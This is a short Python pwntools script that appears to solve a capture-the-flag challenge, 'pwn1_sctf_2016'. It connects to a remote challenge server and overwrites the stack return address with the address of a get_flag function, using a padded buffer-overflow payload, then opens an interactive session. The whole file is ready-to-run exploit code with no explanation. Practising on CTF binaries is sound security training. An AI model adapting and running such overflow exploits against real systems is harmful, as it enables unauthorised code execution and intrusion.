from pwn import *

io = remote('redirect.do-not-trust.hacking.run', 10356)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x4 + p32(address)
# payload = b'I'*20 + b'a'*0x4 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()